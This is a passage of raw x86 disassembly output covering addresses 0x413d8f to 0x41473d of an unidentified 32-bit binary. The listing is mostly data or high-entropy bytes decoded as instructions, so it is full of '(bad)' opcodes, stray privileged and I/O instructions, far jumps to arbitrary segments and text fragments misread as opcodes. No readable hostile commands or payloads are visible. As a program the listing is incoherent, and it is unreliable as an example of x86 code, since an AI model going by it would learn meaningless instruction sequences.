  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	mov    ah,BYTE PTR [edi-0x2e236dee]
  413f06:	add    BYTE PTR [eax],al
  413f08:	add    al,0x1
  413f0a:	add    BYTE PTR [eax],al
  413f0c:	and    BYTE PTR [ecx],bl
  413f0e:	cdq    
  413f0f:	sbb    al,0xfc
  413f11:	pop    edx
  413f12:	xchg   ebp,eax
  413f13:	ret    
  413f14:	repz imul edi,DWORD PTR [esi-0x3a],0x880fff72
  413f1c:	jns    0x413edb
  413f1e:	iret   
  413f1f:	aaa    
  413f20:	mov    esi,0xc67088a8
  413f25:	sub    al,0x72
  413f27:	stos   DWORD PTR es:[edi],eax
  413f28:	(bad)  
  413f29:	mov    edx,0x445256a9
  413f2e:	nop
  413f2f:	idiv   DWORD PTR [edi+0x6ee70bd0]
  413f35:	mov    edx,0x87c04886
  413f3a:	call   0x9872c60a
  413f3f:	fnstsw WORD PTR [eax-0x33a327cc]
  413f45:	xchg   esp,eax
  413f46:	push   eax
  413f47:	dec    edi
  413f48:	adc    BYTE PTR [ebx],dl
  413f4a:	cld    
  413f4b:	fimul  DWORD PTR [ebp+0x28]
  413f4e:	push   esi
  413f4f:	mov    esi,0x38004184
  413f54:	xor    esi,DWORD PTR [edx+0x10]
  413f57:	inc    esp
  413f58:	fcom   QWORD PTR [ebx+esi*8]
  413f5b:	jle    0x413fb8
  413f5d:	and    al,0x95
  413f5f:	xchg   esp,eax
  413f60:	pop    ebx
  413f61:	fcmovnu st,st(4)
  413f63:	xchg   esi,eax
  413f64:	out    dx,eax
  413f65:	xor    al,0xdb
  413f67:	dec    edi
  413f68:	pusha  
  413f69:	addr16 nop
  413f6b:	and    cl,al
  413f6d:	sub    dl,BYTE PTR [ebx]
  413f6f:	cmp    ah,BYTE PTR [edx-0x66f7994a]
  413f75:	aad    0x96
  413f77:	sub    dl,BYTE PTR [eax+0x55e89c93]
  413f7d:	std    
  413f7e:	or     BYTE PTR [edi-0x64],0x4
  413f82:	outs   dx,BYTE PTR ds:[esi]
  413f83:	push   ds
  413f84:	iret   
  413f85:	outs   dx,DWORD PTR ds:[esi]
  413f86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f87:	sub    ecx,DWORD PTR [eax]
  413f89:	fstp   TBYTE PTR [ecx]
  413f8b:	dec    esp
  413f8c:	ror    DWORD PTR [edi+0x77],0x13
  413f90:	mov    ds:0xa25f4377,eax
  413f95:	scas   eax,DWORD PTR es:[edi]
  413f96:	shl    DWORD PTR [ecx],1
  413f98:	jo     0x413f7f
  413f9a:	dec    eax
  413f9b:	dec    edi
  413f9c:	mov    al,ds:0x820ee43f
  413fa1:	pop    ebp
  413fa2:	cbw    
  413fa4:	sbb    DWORD PTR [esi-0x70],ecx
  413fa7:	mov    al,0xbd
  413fa9:	inc    ecx
  413faa:	int3   
  413fab:	mov    bl,0x5e
  413fad:	sub    edi,esp
  413faf:	(bad)  
  413fb0:	pop    ds
  413fb1:	add    dh,BYTE PTR [esp-0x60]
  413fb5:	call   0xcaaf03c2
  413fba:	mov    bh,0x31
  413fbc:	retf   0x66ea
  413fbf:	push   ebp
  413fc0:	lds    esi,FWORD PTR [bx-0x7ec5]
  413fc5:	and    edx,DWORD PTR [eax]
  413fc7:	mov    ebx,0xef691624
  413fcc:	sub    ebx,DWORD PTR [edi+0x17]
  413fcf:	in     al,dx
  413fd0:	call   DWORD PTR [ebx+ecx*1]
  413fd3:	imul   ebx,esp,0x2d63abc1
  413fd9:	ret    0x4158
  413fdc:	jge    0x413fc2
  413fde:	jge    0x414042
  413fe0:	sbb    bl,BYTE PTR [esp+ecx*2-0x52]
  413fe4:	dec    ecx
  413fe5:	mov    ds:0x2ed4cda3,eax
  413fea:	jo     0x413fce
  413fec:	int3   
  413fed:	mov    ah,0xdd
  413fef:	mov    gs:0xbb7bc702,eax
  413ff5:	into   
  413ff6:	shl    DWORD PTR [edx-0x74],1
  413ff9:	dec    edi
  413ffa:	imul   edi,DWORD PTR [edi+0x7],0xfffffffc
  413ffe:	push   ds
  413fff:	add    edi,DWORD PTR [ecx+0x79]
  414002:	mov    ds:0x781eed53,eax
  414007:	neg    DWORD PTR [ecx-0x2827beb1]
  41400d:	jno    0x414076
  41400f:	jae    0x414011
	...
  414071:	add    BYTE PTR [eax],al
  414073:	add    BYTE PTR [edx-0x26],bl
  414076:	push   esi
  414077:	pusha  
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x39a7:0x8ed52e96
  414083:	gs loopne 0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    al,0x1
  41408a:	add    BYTE PTR [eax],al
  41408c:	aad    0x47
  41408e:	int3   
  41408f:	sub    edx,eax
  414091:	je     0x414105
  414093:	call   0xa6b6:0xef3eb0d0
  41409a:	or     ah,BYTE PTR [ebp-0x3af3164c]
  4140a0:	int3   
  4140a1:	mov    ecx,0xf2b3056f
  4140a6:	inc    eax
  4140a7:	fisubr WORD PTR [esi-0x704820fd]
  4140ad:	fadd   QWORD PTR [eax+edx*2]
  4140b0:	push   ecx
  4140b1:	push   edx
  4140b2:	sub    al,0x95
  4140b4:	xchg   esi,eax
  4140b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140b6:	xlat   BYTE PTR ds:[ebx]
  4140b7:	test   al,0x8f
  4140b9:	hlt    
  4140ba:	lock dec ecx
  4140bc:	dec    ecx
  4140bd:	adc    al,0x1
  4140bf:	and    DWORD PTR [ecx-0x44644fb4],edi
  4140c5:	ret    0x87f1
  4140c8:	in     eax,dx
  4140c9:	aas    
  4140ca:	mov    al,0xed
  4140cc:	sub    cl,ah
  4140ce:	das    
  4140cf:	mov    ch,0xfd
  4140d1:	adc    ch,BYTE PTR [eax+0x55b16225]
  4140d7:	lods   eax,DWORD PTR ds:[esi]
  4140d8:	add    ecx,DWORD PTR ds:0x75013337
  4140de:	out    dx,al
  4140df:	loopne 0x414140
  4140e1:	pop    edi
  4140e2:	aam    0x51
  4140e4:	and    ah,0x6b
  4140e7:	hlt    
  4140e8:	enter  0x4ed,0x31
  4140ec:	test   eax,0xdd72428b
  4140f1:	mov    esp,DWORD PTR [edi+0x26b9daaf]
  4140f7:	push   ss
  4140f8:	adc    ah,BYTE PTR [eax+edx*2]
  4140fb:	dec    ecx
  4140fc:	(bad)  
  4140fd:	push   ss
  4140fe:	mov    ds:0x3171dfab,al
  414103:	sub    edi,edi
  414105:	mov    ch,BYTE PTR [ecx+0x6c]
  414108:	ror    DWORD PTR cs:[esi],0x83
  41410c:	sub    eax,0x24a502f0
  414111:	adc    BYTE PTR [eax+0x5a],al
  414114:	mov    bl,BYTE PTR [ecx+0x36265995]
  41411a:	scas   eax,DWORD PTR es:[edi]
  41411b:	or     BYTE PTR [ecx-0x10],bh
  41411e:	retf   0x9899
  414121:	sbb    BYTE PTR [edi],ch
  414123:	ja     0x414176
  414125:	gs jbe 0x4140aa
  414128:	into   
  414129:	stc    
  41412a:	push   ecx
  41412b:	leave  
  41412c:	cmp    eax,0xb1b58186
  414131:	div    DWORD PTR ds:[esi+ecx*1]
  414135:	stc    
  414136:	jno    0x4140e2
  414138:	in     al,0x3f
  41413a:	inc    edx
  41413b:	sub    al,0x97
  41413d:	mov    edx,0x6f812425
  414142:	std    
  414143:	and    DWORD PTR [ebx+eiz*1],eax
  414146:	mov    edi,0x7ac717c8
  41414b:	sbb    DWORD PTR ds:0x46684194,ebp
  414151:	jl     0x4141a3
  414153:	mov    dh,0xc2
  414155:	sub    eax,0xe87780b4
  41415a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41415b:	inc    eax
  41415c:	fcmovnu st,st(3)
  41415e:	jle    0x4141a4
  414160:	sub    BYTE PTR [ebp+0x72],ch
  414163:	stos   DWORD PTR es:[edi],eax
  414164:	enter  0x8236,0x75
  414168:	pop    esi
  414169:	fcom   DWORD PTR [ebp+0x35ca8e81]
  41416f:	jg     0x41410f
  414171:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414172:	(bad)  
  414173:	out    0x26,eax
  414175:	xor    eax,0x985abb8a
  41417a:	int    0x80
  41417c:	mov    ah,BYTE PTR [ebx+0x4644a16e]
  414182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414183:	inc    eax
  414184:	jmp    0x4789235d
  414189:	jnp    0x4141ee
  41418b:	aam    0x4f
  41418d:	sbb    DWORD PTR [edx+0xd7],edx
	...
  4141f3:	add    BYTE PTR [edx],al
  4141f5:	adc    al,BYTE PTR [ecx]
  4141f7:	mov    ds:0xb3a2b311,eax
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	cld    
  414201:	jne    0x41423b
  414203:	sbb    esp,esp
  414205:	rol    DWORD PTR [eax],cl
  414207:	add    BYTE PTR [ecx+eax*1],al
  41420a:	add    BYTE PTR [eax],al
  41420c:	ins    BYTE PTR es:[edi],dx
  41420d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41420e:	pop    ds
  41420f:	imul   edx,DWORD PTR [ebx],0x8aa92d1a
  414215:	in     eax,0x61
  414217:	push   cs
  414218:	out    0x35,eax
  41421a:	pop    ecx
  41421b:	sub    dl,cl
  41421d:	mov    eax,0xa9d5a8b6
  414222:	outs   dx,DWORD PTR ds:[esi]
  414223:	fwait
  414224:	mov    bh,0x77
  414226:	mov    ebp,0xefe8bed3
  41422b:	je     0x414230
  41422d:	or     al,0xa2
  41422f:	sti    
  414230:	ins    DWORD PTR es:[edi],dx
  414231:	sbb    edi,esi
  414233:	or     BYTE PTR [esi],0x9e
  414236:	int3   
  414237:	pop    ebp
  414238:	pop    ebx
  414239:	mov    bh,0xe
  41423b:	(bad)  
  41423c:	xchg   ebx,eax
  41423d:	mov    esp,0x29368c99
  414242:	rep ins DWORD PTR es:[edi],dx
  414244:	mov    esi,0xc86cc719
  414249:	repnz xor al,0x5a
  41424c:	add    eax,0x80ed76e3
  414251:	pop    ds
  414252:	push   esp
  414253:	(bad)  
  414254:	jg     0x414221
  414256:	mov    cl,0x9b
  414258:	nop
  414259:	bound  ebx,QWORD PTR ds:0x910e6e7b
  41425f:	int3   
  414260:	mov    ch,0xca
  414262:	(bad)  
  414263:	aas    
  414264:	dec    esp
  414265:	(bad)  
  414266:	leave  
  414267:	jmp    0xd1c2c284
  41426c:	sar    BYTE PTR [edx+ebp*4],cl
  41426f:	lods   al,BYTE PTR ds:[esi]
  414270:	fisub  DWORD PTR [eax+0x2fac309d]
  414276:	mov    cl,cl
  414278:	add    al,0xc7
  41427a:	sar    cl,cl
  41427c:	rcl    BYTE PTR [eax+0x3e],1
  41427f:	adc    ch,ch
  414281:	push   edi
  414282:	inc    esi
  414283:	inc    ebp
  414284:	pop    es
  414285:	cld    
  414286:	adc    al,0xee
  414288:	adc    esi,DWORD PTR [ebp-0x5b0f63b0]
  41428e:	and    edi,DWORD PTR [edx-0x3f0dc7fe]
  414294:	mov    esi,0xb6f550d5
  414299:	mov    edi,DWORD PTR [eax-0x6a]
  41429c:	mov    ds:0x2a0eaf42,al
  4142a1:	mov    BYTE PTR [edx+0x3c],bl
  4142a4:	or     ah,BYTE PTR [eax+0x14ffc0c6]
  4142aa:	repnz jmp 0xb9e5:0x871d3f7d
  4142b2:	sbb    ebx,esp
  4142b4:	arpl   WORD PTR [ecx-0x146d4a8d],si
  4142ba:	push   ds
  4142bb:	pop    ebp
  4142bc:	sbb    bh,BYTE PTR fs:[edx+0x54c90e40]
  4142c3:	(bad)  
  4142c4:	popf   
  4142c5:	adc    al,0xd9
  4142c7:	inc    ebp
  4142c8:	jge    0x41426c
  4142ca:	sbb    ebx,DWORD PTR [esi-0x12]
  4142cd:	mov    esp,0x373993df
  4142d2:	lods   eax,DWORD PTR ds:[esi]
  4142d3:	push   edi
  4142d4:	pop    es
  4142d5:	xor    BYTE PTR [edi-0x6e],bh
  4142d8:	add    ebp,DWORD PTR [esi-0x3d]
  4142db:	adc    eax,0x794adf77
  4142e0:	dec    ecx
  4142e1:	arpl   bx,si
  4142e3:	pop    ss
  4142e4:	push   esi
  4142e5:	je     0x4142a1
  4142e7:	bound  esp,QWORD PTR [edi+0x6b]
  4142ea:	pop    ebx
  4142eb:	push   0xffffffa6
  4142ed:	aad    0xe5
  4142ef:	popf   
  4142f0:	inc    ecx
  4142f1:	adc    cl,BYTE PTR [edi]
  4142f3:	pop    ds
  4142f4:	retf   
  4142f5:	xlat   BYTE PTR ds:[ebx]
  4142f6:	mov    ds:0xe8fdf508,al
  4142fb:	in     eax,dx
  4142fc:	cmp    al,0x44
  4142fe:	aaa    
  4142ff:	sbb    esi,DWORD PTR [eax+0x71]
  414302:	dec    ebp
  414303:	ss dec ebx
  414305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414306:	popf   
  414307:	or     eax,0x798b7970
  41430c:	call   0x0:0x629cec
	...
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	mov    ?,esp
  414382:	fisubr DWORD PTR [ecx]
  414384:	call   0x441445d
  414389:	add    DWORD PTR [eax],eax
  41438b:	add    cl,bh
  41438d:	fsub   st,st(0)
  41438f:	jno    0x4143d1
  414391:	jno    0x4143be
  414393:	mov    edx,0xbfbd0038
  414398:	nop
  414399:	das    
  41439a:	pop    ebp
  41439b:	cmp    esi,DWORD PTR [ecx-0x401fe2c1]
  4143a1:	call   0xff82b6d9
  4143a6:	dec    ebp
  4143a7:	cli    
  4143a8:	rcl    DWORD PTR [ecx+0x2e],0xce
  4143ac:	sub    ebp,DWORD PTR [esp+esi*2+0x61]
  4143b0:	mov    ecx,0xa9484dc9
  4143b5:	into   
  4143b6:	inc    esp
  4143b7:	sbb    dh,bh
  4143b9:	push   cs
  4143ba:	cmp    al,0xf6
  4143bc:	ss push edi
  4143be:	sub    eax,0x9b805bde
  4143c3:	push   ebx
  4143c4:	into   
  4143c5:	jle    0x4143c0
  4143c7:	pop    edi
  4143c8:	fmul   st,st(0)
  4143ca:	jb     0x4143af
  4143cc:	std    
  4143cd:	inc    ecx
  4143ce:	loopne 0x4143e8
  4143d0:	and    eax,ecx
  4143d2:	xchg   edi,eax
  4143d3:	fmulp  st(7),st
  4143d5:	fidiv  DWORD PTR [edx-0x5185ba0d]
  4143db:	and    al,0xc8
  4143dd:	cmp    DWORD PTR [edi],eax
  4143df:	imul   eax,DWORD PTR [esi+ebx*4],0xd83f1f58
  4143e6:	hlt    
  4143e7:	fdivrp st(0),st
  4143e9:	cmp    edx,ebx
  4143eb:	ficomp DWORD PTR [eax-0x60]
  4143ee:	(bad)  
  4143f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143f1:	pop    edx
  4143f2:	cwd    
  4143f4:	add    eax,0xaec1651c
  4143f9:	sub    ecx,DWORD PTR ds:0x6a70477b
  4143ff:	mov    edi,0x46a44539
  414404:	mov    ebp,0x418cc54b
  414409:	and    dl,BYTE PTR [ebx+ebp*1]
  41440c:	sub    cl,BYTE PTR [edx+ecx*1-0x5749c355]
  414413:	cmp    eax,0xc181ccb3
  414418:	(bad)  
  414419:	arpl   WORD PTR [eax+edx*1-0x21],sp
  41441d:	hlt    
  41441e:	icebp  
  41441f:	rcr    DWORD PTR [ecx],cl
  414421:	add    eax,0x219d6b66
  414426:	xlat   BYTE PTR ds:[ebx]
  414427:	mov    es,WORD PTR [eax+0xa]
  41442a:	sub    al,0x9d
  41442c:	call   0x27742bf4
  414431:	ret    0xf1cc
  414434:	mov    ebp,0x3700d035
  414439:	pop    esi
  41443a:	sbb    eax,0xdf967ad
  41443f:	pop    esi
  414440:	mov    eax,0xe8d5a4f4
  414445:	fsubr  QWORD PTR [eax]
  414447:	shl    BYTE PTR [ebp+0x30bbfcbb],0xd0
  41444e:	add    al,0xa4
  414450:	addr16 adc ebx,ebx
  414453:	addr16 push ss
  414455:	neg    DWORD PTR [eax+0x48845d7]
  41445b:	pop    esi
  41445c:	mov    ch,0xee
  41445e:	jbe    0x41440b
  414460:	and    edx,DWORD PTR [ebx-0x6a]
  414463:	and    al,BYTE PTR [ebx+0x78]
  414466:	stc    
  414467:	lods   al,BYTE PTR ds:[esi]
  414468:	adc    BYTE PTR ds:0xdde0,ch
  41446d:	push   es
  41446e:	push   edi
  41446f:	dec    esp
  414470:	jge    0x414414
  414472:	sub    DWORD PTR [esi+0x77],0xd078f93e
  414479:	(bad)  
  41447a:	loope  0x41441a
  41447c:	lahf   
  41447d:	pop    ebp
  41447e:	jns    0x4144ee
  414480:	mov    al,ds:0xdf9f0935
  414485:	in     eax,dx
  414486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414487:	push   edx
  414488:	sahf   
  414489:	nop
  41448a:	inc    edi
  41448b:	and    edi,DWORD PTR [ebx+0xd6e6f7]
	...
  4144f1:	add    BYTE PTR [eax],al
  4144f3:	add    BYTE PTR [ebx+0x73],bl
  4144f6:	inc    edx
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi-0x4f]
  414501:	sar    BYTE PTR [eax+0xd5ecc6],cl
  414507:	add    BYTE PTR [ecx+eax*1],al
  41450a:	add    BYTE PTR [eax],al
  41450c:	mov    eax,ds:0xbd75ad11
  414511:	fisub  DWORD PTR [esi+0x318698a]
  414517:	aaa    
  414518:	lahf   
  414519:	xor    cl,BYTE PTR [ebx-0x70d75617]
  41451f:	sub    BYTE PTR [ecx],dl
  414521:	jle    0x414525
  414523:	int3   
  414524:	sti    
  414525:	pop    es
  414526:	fistp  QWORD PTR [edx+0x70]
  414529:	scas   eax,DWORD PTR es:[edi]
  41452a:	dec    ecx
  41452b:	mov    ah,0x34
  41452d:	pusha  
  41452e:	mov    bh,0x75
  414530:	(bad)  
  414531:	icebp  
  414532:	fxam   
  414534:	xchg   ebx,eax
  414535:	(bad)  
  414537:	outs   dx,BYTE PTR ds:[esi]
  414538:	std    
  414539:	pop    esi
  41453a:	cmp    al,0x43
  41453c:	push   cs
  41453d:	xchg   ebx,eax
  41453e:	je     0x414504
  414540:	xchg   ecx,eax
  414541:	ja     0x4144c3
  414543:	pop    eax
  414544:	jg     0x414590
  414546:	sbb    BYTE PTR [eax-0x47],dh
  414549:	xor    edx,DWORD PTR [edx-0x4c055c04]
  41454f:	call   0x5ca4ce3d
  414554:	scas   eax,DWORD PTR es:[edi]
  414555:	push   ebp
  414556:	jle    0x414588
  414558:	test   DWORD PTR [edi-0x375704f8],0x2136f1a3
  414562:	mov    al,ds:0x1b49624c
  414567:	out    dx,eax
  414568:	int3   
  414569:	out    0x2b,al
  41456b:	je     0x4145e6
  41456d:	es xchg esp,eax
  41456f:	dec    ebp
  414570:	jnp    0x4145ee
  414572:	ret    
  414573:	ins    DWORD PTR es:[edi],dx
  414574:	pop    eax
  414575:	pop    esi
  414576:	push   0xffffffa2
  414578:	ds loope 0x41451e
  41457b:	enter  0xfe5d,0xbb
  41457f:	sub    eax,0x9ff479b1
  414584:	in     eax,0x27
  414586:	out    0xb8,al
  414588:	test   eax,0xad5dd5aa
  41458d:	repnz popa 
  41458f:	in     eax,dx
  414590:	dec    edi
  414591:	pop    edi
  414592:	push   esi
  414593:	ss sub eax,0x2a13c8a9
  414599:	stc    
  41459a:	les    edi,FWORD PTR [eax+0x24]
  41459d:	imul   ebx,edi,0x5804dbe4
  4145a3:	sbb    DWORD PTR [ecx+eax*4],edi
  4145a6:	addr16 sbb al,0xd4
  4145a9:	pop    esi
  4145aa:	pop    esp
  4145ab:	adc    eax,edi
  4145ad:	mov    bl,0x3a
  4145af:	mov    ecx,0xe3e476a3
  4145b4:	(bad)  
  4145b5:	call   0xb3043f1d
  4145ba:	mov    ds:0xdefa83da,al
  4145bf:	sbb    al,0x96
  4145c1:	or     BYTE PTR [ebx+ebp*4+0x3f],al
  4145c5:	stos   BYTE PTR es:[edi],al
  4145c6:	add    BYTE PTR [edx+ebp*2-0x490351e4],bh
  4145cd:	jmp    0xe064:0x80741e9e
  4145d4:	push   ecx
  4145d5:	jno    0x41460d
  4145d7:	sub    eax,DWORD PTR [ecx-0x41]
  4145da:	retf   
  4145db:	(bad)  
  4145dc:	and    al,0x9e
  4145de:	test   al,0x7a
  4145e0:	test   DWORD PTR [edx-0x3a27ee7a],esp
  4145e6:	jo     0x4145c4
  4145e8:	(bad)  
  4145e9:	stc    
  4145ea:	je     0x414627
  4145ec:	push   ebx
  4145ed:	jne    0x414663
  4145ef:	sbb    eax,0x46332bb9
  4145f4:	es mov edi,0x86ab241b
  4145fa:	fiadd  WORD PTR [ecx+0x24]
  4145fd:	add    al,0xb4
  4145ff:	push   eax
  414600:	fucomp st(2)
  414602:	mov    bh,0x9
  414604:	daa    
  414605:	xchg   ebx,eax
  414606:	or     edx,eax
  414608:	cmp    ah,ah
  41460a:	loope  0x4145a8
  41460c:	popa   
  41460d:	dec    esp
  41460e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41460f:	mov    dl,0x0
	...
  414671:	add    BYTE PTR [eax],al
  414673:	add    BYTE PTR [edi+0x5e],bh
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0xef
  414681:	inc    esi
  414682:	lds    edx,FWORD PTR [eax+0xd6f0]
  414688:	add    al,0x1
  41468a:	add    BYTE PTR [eax],al
  41468c:	(bad)  
  41468d:	enter  0x5671,0x92
  414691:	mov    ds:0x8ea638b5,al
  414696:	mov    ecx,?
  414698:	mov    ecx,0xe5544643
  41469d:	in     al,0x0
  41469f:	adc    DWORD PTR [eax-0x39d22582],0xeb95731e
  4146a9:	ret    0x7b95
  4146ac:	xchg   edi,eax
  4146ad:	xchg   DWORD PTR [edx+edx*1],ebp
  4146b0:	mov    al,dh
  4146b2:	hlt    
  4146b3:	aam    0xbc
  4146b5:	jne    0x41466e
  4146b7:	cmp    al,0x23
  4146b9:	rcr    ebx,cl
  4146bb:	jmp    0xbd4:0x1c6f
  4146c1:	(bad)  
  4146c3:	mov    esi,0x603b2d56
  4146c8:	jno    0x414696
  4146ca:	cmp    BYTE PTR [esi+ecx*4+0x4bf7cde4],bh
  4146d1:	(bad)  
  4146d3:	dec    edx
  4146d4:	xchg   ebp,eax
  4146d5:	cmp    ebx,DWORD PTR [edi]
  4146d7:	push   ebx
  4146d8:	adc    ebp,DWORD PTR [ecx+0x154f938c]
  4146de:	shl    DWORD PTR [edx+0x7],cl
  4146e1:	test   al,0x43
  4146e3:	out    dx,al
  4146e4:	mov    bh,0x79
  4146e6:	pop    eax
  4146e7:	call   0xecc9:0x8e29c024
  4146ee:	(bad)  
  4146ef:	pop    edi
  4146f0:	or     DWORD PTR [ecx+0x11],eax
  4146f3:	pusha  
  4146f4:	sub    bh,BYTE PTR [ecx+0x1]
  4146f7:	push   esp
  4146f8:	repnz and ch,BYTE PTR [eax+0x7c]
  4146fc:	xor    eax,0x45f450c8
  414701:	mov    edx,DWORD PTR [edi+0x6c9a5c13]
  414707:	and    eax,0x2acfd7f8
  41470c:	mov    edx,0x70aee418
  414711:	xor    BYTE PTR [edi+0x7a],bl
  414714:	pop    es
  414715:	or     DWORD PTR [ecx+0x269566cc],ebp
  41471b:	into   
  41471c:	leave  
  41471d:	sbb    ah,BYTE PTR [ecx+eiz*8]
  414720:	adc    dh,BYTE PTR [ecx]
  414722:	cmp    al,0xe0
  414724:	mov    al,BYTE PTR [edi*8+0x449e558a]
  41472b:	mov    ah,0xf3
  41472d:	push   esp
  41472e:	icebp  
  41472f:	sbb    BYTE PTR [edi+0x2b],ah
  414732:	sbb    BYTE PTR [ebx-0x4572731b],0x41
  414739:	lahf   
  41473a:	mov    ch,bh
  41473c:	(bad)  
  41473d:	rol    DWORD PTR [ebp+edi*1+0x17],1
